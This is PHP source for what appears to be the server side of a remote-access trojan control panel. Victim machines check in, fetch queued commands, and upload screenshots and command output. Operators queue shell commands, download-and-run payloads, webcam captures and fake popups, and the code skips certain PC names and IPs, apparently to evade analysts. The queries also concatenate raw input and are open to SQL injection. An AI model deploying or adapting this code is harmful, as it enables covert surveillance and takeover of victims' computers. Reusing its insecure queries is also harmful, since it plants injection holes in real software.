<?php
require 'Utils.php';
$Utils = new Utils();
$Utils->LoadDB();


///////////////////////////
//////////////////////////
////                 ////
/// REMOTE COMMANDS ////
//                 ////
//////////////////////
/////////////////////
//ID, IP, Command, Args, Running, Done, Output
//Create json view for the Target
if (isset($_GET['Cmd'])) {
    $IP = $Utils->get_client_ip();
    $query = "SELECT ID, Command, Args, Running, Done FROM Commands WHERE IP = '$IP' ";
    $rows = mysqli_query(Utils::$connect, $query) or die('Error, query failed: ' . mysqli_error(Utils::$connect));

    if (mysqli_num_rows($rows) == 0) {
        echo "Database is empty <br>";
    } else {
        $Prep = array();
        while ($row = mysqli_fetch_assoc($rows)) {
            $Prep[] = $row;
        }
        echo(json_encode($Prep));
    }
    die();
}

//Notify the GUI of a running command
if (isset($_GET['RunningCmd'])) {
    $ID = $Utils->FormatString($_GET['RunningCmd']);
    $Random = random_int(0, 123123);
    $Date = date("Y-m-d G:i:s");
    $query = "UPDATE Commands SET Running='1',UniID='$Random',Date='$Date'  WHERE id = '$ID'";
    $rows = mysqli_query(Utils::$connect, $query) or die('Error, query failed: ' . mysqli_error(Utils::$connect));
    die();
}

//Notify the GUI of a Done command and give the output
if (isset($_POST['DoneID'])) {
    $ID = $Utils->FormatString($_POST['DoneID']);
    $Output = $Utils->FormatString($_POST['DoneCmd']);
    $Random = random_int(0, 123123);
    $Date = date("Y-m-d G:i:s");
    $query = "UPDATE Commands SET Running='0',Done='1',Output='$Output',UniID='$Random',Date='$Date'  WHERE ID = '$ID'";
    $rows = mysqli_query(Utils::$connect, $query) or die('Error, query failed: ' . mysqli_error(Utils::$connect));
    die();
}

//Postupload for the Target to upload an ScreenShot
if (isset($_GET['UploadSS'])) {
    $fileName = $_FILES['file']['name'];
    $tmpName = $_FILES['file']['tmp_name'];
    $fileSize = $_FILES['file']['size'];
    $fileType = $_FILES['file']['type'];
    $fp = fopen($tmpName, 'r');
    $content = fread($fp, filesize($tmpName));
    $content = addslashes($content);
    fclose($fp);
    echo "File: $fileName, Size: $fileSize";

    if (!get_magic_quotes_gpc()) {
        $fileName = addslashes($fileName);
    }
    $query = "INSERT INTO UploadSS (name, size, type, content ) " .
            "VALUES ('$fileName', '$fileSize', '$fileType', '$content')";
    //mysql_query($query) or die('Error, query failed');
    mysqli_query(Utils::$connect, $query) or die('Error, query failed');
    die();
}

//Notify for the gui that an Target came online
if (isset($_GET['CameOnline'])) {
    $mydate = getdate(date("U"));
    $Date = "$mydate[weekday], $mydate[month] $mydate[mday], $mydate[year] -- " . ($mydate[hours] + 2) . ", $mydate[minutes]";
    $PCName = $Utils->FormatString($_GET['CameOnline']);
    $IP = $Utils->get_client_ip();
    $IgnoredPC = array("GGJADLU-PC", "", "RQTPJUM-PC", "JOHN-PC");
    $IgnoredIP = array("207.244.70.35", "104.223.123.98", "104.238.46.116", "91.109.28.130", "77.247.181.165", "95.26.21.167");
    if (in_array($PCName, $IgnoredPC)) {
        return;
    }
    if (in_array($IP, $IgnoredIP)) {
        return;
    }

    $query = "INSERT INTO RemoteRegister (IP, date, PCName ) " .
            "VALUES ('$IP', '$Date', '$PCName')";

    $rows = mysqli_query(Utils::$connect, $query) or die('Error, query failed: ' . mysqli_error(Utils::$connect));
}

///////////////////////
//////////////////////
////              ///
/// GUI COMMANDS ///
//              ///
//////////////////
/////////////////



//Create json view for the AutoUpdater
if (isset($_GET['Update'])) {
    $IP = $Utils->get_client_ip();
    //$Date = date("Y-m-d G:i:sa");
    $Date = date("Y-m-d G:i:s", strtotime("-6 Seconds"));
    //echo $Date . " Old:Current " . date("Y-m-d G:i:s"); 
    $query = "SELECT * FROM `Commands` WHERE Date >= '$Date'";
    $rows = mysqli_query(Utils::$connect, $query) or die('Error, query failed: ' . mysqli_error(Utils::$connect));
    
    if (mysqli_num_rows($rows) == 0) {
        echo "ty";
    } else {
        $Prep = array();
        while ($row = mysqli_fetch_assoc($rows)) {
            $Prep[] = $row;
        }
        echo(json_encode($Prep));
    }
    die();
}

//Add command to the DB
if (isset($_GET['AddCmd'])) {
    if (isset($_POST['AddCmd'])) {
        $IP = $Utils->FormatString($_POST['IP']);
        $Cmd = $Utils->FormatString($_POST['CommandType']);
        //$Args = $Utils->FormatString($_POST['Arguments']);
        $Args = $_POST['Arguments'];
        $Random = random_int(0, 123123);
        $UserName = $_SESSION['username'];
        $Date = date("Y-m-d G:i:s");
        $Utils->SetCookie("IP", $IP);
        $Utils->SetCookie("Cmd", $Cmd);
        $Utils->SetCookie("Args", $Args);
        $query = "INSERT INTO Commands (IP, Command, Args, UniID, Date, UserName ) " .
                "VALUES ('$IP', '$Cmd', '$Args', '$Random', '$Date', '$UserName')";
        echo "<script>this.location='Remote.php?AddCmd=1';</script>";
        $rows = mysqli_query(Utils::$connect, $query) or die('Error, query failed: ' . mysqli_error(Utils::$connect));
    }
    $IP = (isset($_COOKIE['IP']) == 1) ? $_COOKIE['IP'] : '';
    $Cmd = (isset($_COOKIE['Cmd']) == 1) ? $_COOKIE['Cmd'] : '';
    $Args = (isset($_COOKIE['Args']) == 1) ? $_COOKIE['Args'] : '';
    //selected
    ?>
    <form action="Remote.php?AddCmd=1" method="post" style="text-align: right;">
        <p>IP: <input name="IP" type="text" size="40" maxlength="25" value="<?php echo $IP; ?>"/></p>
        CommandType: <select name="CommandType">
            <option value="cmd" <?php echo ($Cmd == "cmd") ? 'selected' : ''; ?>>cmd (CommandPrompt)Args=Command</option>
            <option value="Start" <?php echo ($Cmd == "Start") ? 'selected' : ''; ?>>StartProgram(Download&Run) Args=ID</option>
            <option value="Download" <?php echo ($Cmd == "Download") ? 'selected' : ''; ?>>DownloadProgram Args=ID</option>
            <option value="StartHidden" <?php echo ($Cmd == "StartHidden") ? 'selected' : ''; ?>>PlaySoundHidden(Download&Run) Args=SoundID</option>
            <option value="UploadSS" <?php echo ($Cmd == "UploadSS") ? 'selected' : ''; ?>>Screenshot(0=Primary) Args=Screen</option>
            <option value="UploadCam" <?php echo ($Cmd == "UploadCam") ? 'selected' : ''; ?>>Webcam(0=Webcam 1) Args=WebcamID</option>
            <option value="PopupWarn" <?php echo ($Cmd == "PopupWarn") ? 'selected' : ''; ?>>Popup(Yellow Warning) Args=Text</option>
            <option value="PopupErr" <?php echo ($Cmd == "PopupErr") ? 'selected' : ''; ?>>Popup(Red X) Args=Text</option>
            <option value="Popup" <?php echo ($Cmd == "Popup") ? 'selected' : ''; ?>>Popup (No symbols) Args=Text</option>
        </select>
        <p>Arguments: <input name="Arguments" type="text" size="40" maxlength="500" value="<?php echo $Args; ?>" /></p>
        <p><input name="AddCmd" type="submit" size="40" value="Submit" /></p>
    </form>
    <?php
    die();
}
